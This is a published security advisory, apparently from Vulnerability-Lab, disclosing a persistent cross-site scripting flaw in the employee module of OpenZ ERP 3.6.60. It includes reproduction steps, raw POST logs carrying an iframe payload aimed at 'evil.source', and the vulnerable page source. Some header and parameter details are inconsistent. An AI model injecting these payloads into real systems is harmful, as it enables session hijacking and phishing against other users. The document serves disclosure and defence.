@@ -1,0 +1,192 @@
+# Exploit Title: OpenZ ERP 3.6.60 - Persistent Cross-Site Scripting
+# Date: 2020-05-11
+# Exploit Author: Vulnerability-Lab
+# Vendor: https://www.openz.de/
+# https://www.openz.de/download.html
+
+Document Title:
+===============
+OpenZ v3.6.60 ERP - Employee Persistent XSS Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2234
+
+
+Common Vulnerability Scoring System:
+====================================
+4.6
+
+
+Product & Service Introduction:
+===============================
+https://www.openz.de/
+https://www.openz.de/download.html
+
+
+Affected Product(s):
+====================
+OpenZ
+Product: OpenZ v3.6.60 - ERP (Web-Application)
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-06: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A persistent cross site scripting web vulnerability has been discovered
+in the official OpenZ v3.6.60 ERP web-application.
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise
+browser to web-application requests from the application-side.
+
+The persistent vulnerability is located in the `inpname` and
+`inpdescripción` parameters of the `Employee` add/register/edit
+module in the `menu.html` file. Remote attackers with low privileges are
+able to inject own malicious persistent script code as
+name or description. The injected code can be used to attack the
+frontend or backend of the web-application. The request method
+to inject is POST and the attack vector is located on the
+application-side. The attack can be triggered from low privilege user
+accounts against higher privilege user accounts like manager or
+administrators to elevate privileges via session hijacking.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent external
+redirects to malicious source and persistent manipulation of affected
+application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Employee
+
+Vulnerable Input(s):
+[+] Mitarbeiter Name
+[+] Beschreibung
+
+Vulnerable File(s):
+[+] Menu.html
+
+Vulnerable Parameter(s):
+[+] inpname
+[+] inpdescription
+
+
+Proof of Concept (PoC):
+=======================
+The persistent web vulnerability can be exploited by low privileged web
+application user account with low user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Open the openz web-application
+2. Register, add or edit via profile settings the inpname &
+inpdescription parameter inputs
+3. Edit inpname & inpdescription parameter of the profile and save the entry
+Note: The execute occurs on preview of the user credentials in the
+/org.openbravo.zsoft.smartui.Employee/SalesRepVendor8BAE92BA22C14B1487EB2B247FA4A977_Edition.html
+4. Successful reproduce of the persistent web vulnerability!
+
+
+
+--- POC Session Logs [POST] --- (Inject via Add / Edit)
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/EmployeeA3D0B320B69845B386024B5FF6B1E266_Relation.html
+Host: localhost:8080
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1464
+Origin: https://localhost:8080
+Connection: keep-alive
+Referer:
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/EmployeeA3D0B320B69845B386024B5FF6B1E266_Relation.html
+Cookie: JSESSIONID=0692EC25BA33001B002059E182BA1544;
+_ga=GA1.2.403279990.1587913275; _gid=GA1.2.274268317.1587913275
+Command=SAVE_EDIT_RELATION&inpLastFieldChanged=inpdescription&inpkeyColumnIdInp=&inpParentKeyColumn=&inpDirectKey=&
+inpKeyReferenceColumnName=&inpTableReferenceId=&inpKeyReferenceId=&autosave=N&inpnewdatasetindicator=&inpnewdataseIdVal=&
+inpenabledautosave=Y&inpisemployee=Y&inpistaxexempt=N&inpadClientId=C726FEC915A54A0995C568555DA5BB3C&inpaAssetId=&
+inpcGreetingId=&inpcBpartnerId=8BEB3E9FD5D24F9BBCF777A51D53F5AF&inpissummary=N&inprating=N&inpTableId=AC9B98C649CD4F55B37714008EE8519F&
+inpkeyColumnId=C_BPartner_ID&inpKeyName=inpcBpartnerId&mappingName=/org.openbravo.zsoft.smartui.Employee/
+EmployeeA3D0B320B69845B386024B5FF6B1E266_Relation.html&inpwindowId=39D3CD9F77A942D690965D49106F011B&
+inpTabId=A3D0B320B69845B386024B5FF6B1E266&inpCommandType=EDIT&updatedTimestamp=20200426170335&inpParentOrganization=&
+inpadOrgId=1AF9E07685234E0A9FEC1D9B58A4876B&inpadImageId=&
+inpvalue=325235&inpname=>"><iframe
+src=evil.source><iframe></iframe></iframe>&
+inpdescription=>"><iframe
+src=evil.source><iframe></iframe></iframe>&inpimageurl=31337&
+inpisactive=Y&inpisinresourceplan=Y&inpapprovalamt=0,00&inpcSalaryCategoryId=&inptaxid=&inpreferenceno=&
+inpcBpGroupId=42691AE1D13F400AB814B70361E167C3&inpadLanguage=de_DE&inpcountry=Deutschland&inpzipcode=&
+inpcity=&inpcreated=26-04-2020
+17:03:35&inpcreatedby=Service&inpupdated=26-04-2020
+17:03:35&inpupdatedby=Service
+-
+POST: HTTP/1.1 302 Found
+Server: Apache/2.4.38 (Debian)
+Location:
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/EmployeeA3D0B320B69845B386024B5FF6B1E266_Relation.html?Command=RELATION
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+- (Execution in Listing)
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/evil.source
+Host: myerponline.de
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Connection: keep-alive
+Referer:
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/SalesRepVendor8BAE92BA22C14B1487EB2B247FA4A977_Edition.html
+Cookie: JSESSIONID=0692EC25BA33001B002059E182BA1544;
+_ga=GA1.2.403279990.1587913275; _gid=GA1.2.274268317.1587913275
+-
+GET: HTTP/1.1 200 OK
+Server: Apache/2.4.38 (Debian)
+Content-Type: text/html;charset=utf-8
+Content-Language: en
+Content-Length: 1110
+Keep-Alive: timeout=5, max=97
+Connection: Keep-Alive
+
+
+PoC: Vulnerable Source (/security/Menu.html)
+<table width="0px" height="0px" cellspacing="0" cellpadding="0">
+<tbody><tr>
+<td><input type="text" class="DataGrid_Table_Dummy_Input"
+id="grid_table_dummy_input"></td>
+</tr>
+</tbody></table>
+<input type="hidden" name="inpcBpartnerId"
+value="8BEB3E9FD5D24F9BBCF777A51D53F5AF" id="keyParent">
+<div class="RelationInfoContainer">
+<table class="RelationInfo">
+<tbody><tr>
+<td class="RelationInfoTitle" id="related_info_cont">Business Partner:</td>
+<td class="RelationInfoContent" id="paramParentC_BPartner_ID">325235 -
+>"><iframe src="a"></TD>
+</TR>
+
+
+Reference(s):
+https://localhost:8080/
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/
+https://localhost:8080/openz/org.openbravo.zsoft.smartui.Employee/Employee
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
